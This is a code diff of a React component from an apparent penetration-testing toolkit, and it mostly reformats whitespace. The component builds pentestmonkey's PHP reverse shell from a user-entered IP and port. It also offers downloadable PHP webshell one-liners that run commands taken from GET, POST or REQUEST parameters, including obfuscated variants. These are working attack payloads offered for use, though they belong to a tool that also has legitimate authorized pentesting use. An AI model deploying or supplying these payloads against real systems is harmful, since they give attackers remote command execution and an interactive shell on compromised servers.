@@ -16,25 +16,24 @@ import pretty from 'pretty';
 
 const { Title, Paragraph, Text } = Typography;
 const { Panel } = Collapse;
-const IconFont = createFromIconfontCN( {
-    scriptUrl: [ './iconfont.js' ]
-} );
+const IconFont = createFromIconfontCN({
+    scriptUrl: ['./iconfont.js']
+});
 
 
-
-export default function PhpReverseShell () {
-    const useIPv4State = PersistedState<Ipv4TcpCacheState>( 'ipv4_tcp_cache' );
-    const [ values, setValues ] = useIPv4State( {
+export default function PhpReverseShell() {
+    const useIPv4State = PersistedState<Ipv4TcpCacheState>('ipv4_tcp_cache');
+    const [values, setValues] = useIPv4State({
         ip: '',
         port: '',
-    } );
-    const handleChange = ( name: string ) => ( event: { target: { value: string; }; } ) => {
-        setValues( { ...values, [ name ]: event.target.value } );
+    });
+    const handleChange = (name: string) => (event: { target: { value: string; }; }) => {
+        setValues({ ...values, [name]: event.target.value });
     };
 
-    const [ messageApi, contextHolder ] = message.useMessage();
+    const [messageApi, contextHolder] = message.useMessage();
     const successInfoReverseShell = () => {
-        messageApi.success( 'Your reverse shell has been copied successfully !' );
+        messageApi.success('Your reverse shell has been copied successfully !');
     };
 
     const oneLiner = `<?php system($_GET["cmd"]);?>`;
@@ -51,8 +50,8 @@ export default function PhpReverseShell () {
 
   set_time_limit (0);
   $VERSION = "1.0";
-  $ip = '${ values.ip }';  // You have changed this
-  $port = ${ values.port };  // And this
+  $ip = '${values.ip}';  // You have changed this
+  $port = ${values.port};  // And this
   $chunk_size = 1400;
   $write_a = null;
   $error_a = null;
@@ -201,9 +200,18 @@ export default function PhpReverseShell () {
                     PHP Webshell
                 </Title>
                 <Paragraph style={{ margin: 15 }}>
-                    Attackers who successfully exploit a remote command execution vulnerability can use a reverse shell to
+                    Attackers who successfully exploit a remote code/command execution vulnerability can use a reverse shell to
                     obtain an interactive shell session on the target machine and continue their attack.
                 </Paragraph>
+
+            </div>
+            <Divider orientation='center'>Pentestmonkey's reverse shell</Divider>
+            <div
+                style={{
+                    padding: 15,
+                    marginTop: 15
+                }}
+            >
                 <div style={{ padding: 15 }}>
                     <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
                         <Col span={12}>
@@ -212,7 +220,7 @@ export default function PhpReverseShell () {
                                 prefix={<WifiOutlined />}
                                 name='Ip adress'
                                 placeholder='IP Address or domain (ex: 212.212.111.222)'
-                                onChange={handleChange( 'ip' )}
+                                onChange={handleChange('ip')}
                                 value={values.ip}
                             />
                         </Col>
@@ -222,25 +230,17 @@ export default function PhpReverseShell () {
                                 prefix={<IconFont type='icon-Network-Plug' />}
                                 name='Port'
                                 placeholder='Port (ex: 1337)'
-                                onChange={handleChange( 'port' )}
+                                onChange={handleChange('port')}
                                 value={values.port}
                             />
                         </Col>
                     </Row>
                 </div>
-            </div>
-            <Divider orientation='center'>Pentestmonkey's reverse shell</Divider>
-            <div
-                style={{
-                    padding: 15,
-                    marginTop: 15
-                }}
-            >
                 <Paragraph>This script will make an outbound TCP connection to a hardcoded IP and port.</Paragraph>
-                <Collapse defaultActiveKey={[ '0' ]}>
+                <Collapse defaultActiveKey={['0']}>
                     <Panel header='View the souce code' key='1'>
                         <SyntaxHighlighter language='php' style={vs2015} showLineNumbers={true}>
-                            {pretty( phpReverseShell )}
+                            {pretty(phpReverseShell)}
                         </SyntaxHighlighter>
                         <Button href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" target='blank' type='dashed' style={{ marginBottom: 10, marginTop: 15 }}>
                             <ArrowsAltOutlined style={{ marginRight: 10 }} />
@@ -252,13 +252,13 @@ export default function PhpReverseShell () {
                     type='primary'
                     style={{ marginBottom: 10, marginTop: 15 }}
                     onClick={() => {
-                        const element = document.createElement( 'a' );
-                        const file = new Blob( [ phpReverseShell ], {
+                        const element = document.createElement('a');
+                        const file = new Blob([phpReverseShell], {
                             type: 'text/plain'
-                        } );
-                        element.href = URL.createObjectURL( file );
+                        });
+                        element.href = URL.createObjectURL(file);
                         element.download = 'rev.php';
-                        document.body.appendChild( element );
+                        document.body.appendChild(element);
                         element.click();
                     }}
                 >
@@ -292,13 +292,13 @@ export default function PhpReverseShell () {
                     type='primary'
                     style={{ marginBottom: 10, marginTop: 15 }}
                     onClick={() => {
-                        const element = document.createElement( 'a' );
-                        const file = new Blob( [ oneLiner ], {
+                        const element = document.createElement('a');
+                        const file = new Blob([oneLiner], {
                             type: 'text/plain'
-                        } );
-                        element.href = URL.createObjectURL( file );
+                        });
+                        element.href = URL.createObjectURL(file);
                         element.download = 'basicRCE.php';
-                        document.body.appendChild( element );
+                        document.body.appendChild(element);
                         element.click();
                     }}
                 >
@@ -327,7 +327,7 @@ export default function PhpReverseShell () {
                     p0wny@shell:~# is a very basic, single-file, PHP shell. It can be used to quickly execute commands
                     on a server when pentesting a PHP application.
                 </Paragraph>
-                <Collapse defaultActiveKey={[ '0' ]}>
+                <Collapse defaultActiveKey={['0']}>
                     <Panel header='Watch the preview' key='1'>
                         <img
                             src='https://i.imgur.com/ALPFDj0.png'
@@ -356,13 +356,13 @@ export default function PhpReverseShell () {
                     type='primary'
                     style={{ marginBottom: 10, marginTop: 15 }}
                     onClick={() => {
-                        const element = document.createElement( 'a' );
-                        const file = new Blob( [ '<?=`$_GET[0]`?>' ], {
+                        const element = document.createElement('a');
+                        const file = new Blob(['<?=`$_GET[0]`?>'], {
                             type: 'text/plain'
-                        } );
-                        element.href = URL.createObjectURL( file );
+                        });
+                        element.href = URL.createObjectURL(file);
                         element.download = 'obfuscateShell.php';
-                        document.body.appendChild( element );
+                        document.body.appendChild(element);
                         element.click();
                     }}
                 >
@@ -386,13 +386,13 @@ export default function PhpReverseShell () {
                     type='primary'
                     style={{ marginBottom: 10, marginTop: 15 }}
                     onClick={() => {
-                        const element = document.createElement( 'a' );
-                        const file = new Blob( [ '<?=`$_POST[0]`?>' ], {
+                        const element = document.createElement('a');
+                        const file = new Blob(['<?=`$_POST[0]`?>'], {
                             type: 'text/plain'
-                        } );
-                        element.href = URL.createObjectURL( file );
+                        });
+                        element.href = URL.createObjectURL(file);
                         element.download = 'obfuscateShell.php';
-                        document.body.appendChild( element );
+                        document.body.appendChild(element);
                         element.click();
                     }}
                 >
@@ -418,13 +418,13 @@ export default function PhpReverseShell () {
                     type='primary'
                     style={{ marginBottom: 10, marginTop: 15 }}
                     onClick={() => {
-                        const element = document.createElement( 'a' );
-                        const file = new Blob( [ "<?=`{$_REQUEST['_']}`?>" ], {
+                        const element = document.createElement('a');
+                        const file = new Blob(["<?=`{$_REQUEST['_']}`?>"], {
                             type: 'text/plain'
-                        } );
-                        element.href = URL.createObjectURL( file );
+                        });
+                        element.href = URL.createObjectURL(file);
                         element.download = 'obfuscateShell.php';
-                        document.body.appendChild( element );
+                        document.body.appendChild(element);
                         element.click();
                     }}
                 >
@@ -449,13 +449,13 @@ export default function PhpReverseShell () {
                     type='primary'
                     style={{ marginBottom: 10, marginTop: 15 }}
                     onClick={() => {
-                        const element = document.createElement( 'a' );
-                        const file = new Blob( [ shell_obfuscate ], {
+                        const element = document.createElement('a');
+                        const file = new Blob([shell_obfuscate], {
                             type: 'text/plain'
-                        } );
-                        element.href = URL.createObjectURL( file );
+                        });
+                        element.href = URL.createObjectURL(file);
                         element.download = 'obfuscateShell.php';
-                        document.body.appendChild( element );
+                        document.body.appendChild(element);
                         element.click();
                     }}
                 >
@@ -481,13 +481,13 @@ export default function PhpReverseShell () {
                     type='primary'
                     style={{ marginBottom: 10, marginTop: 15 }}
                     onClick={() => {
-                        const element = document.createElement( 'a' );
-                        const file = new Blob( [ shell_obfuscate_function ], {
+                        const element = document.createElement('a');
+                        const file = new Blob([shell_obfuscate_function], {
                             type: 'text/plain'
-                        } );
-                        element.href = URL.createObjectURL( file );
+                        });
+                        element.href = URL.createObjectURL(file);
                         element.download = 'obfuscateShell.php';
-                        document.body.appendChild( element );
+                        document.body.appendChild(element);
                         element.click();
                     }}
                 >
